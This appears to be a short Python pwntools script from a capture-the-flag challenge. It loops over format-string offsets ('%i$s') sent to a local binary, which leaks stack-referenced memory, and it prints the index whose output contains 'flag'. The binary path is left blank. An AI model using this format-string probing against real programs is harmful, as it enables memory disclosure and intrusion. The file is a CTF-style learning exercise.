import pwn

pwn.context.log_level='WARN' # if need more info -> 'INFO'
for i in range(80): # Challenge 0-80 to brute force
    try:
        p=pwn.process("./")
        p.recv()
        p.sendline("%"+str(i)+"$s") # get index value with format
        msg = p.recv()
        print msg
        if 'flag' in msg:
            print i
        p.close()
    except:
        p.close()
        pass
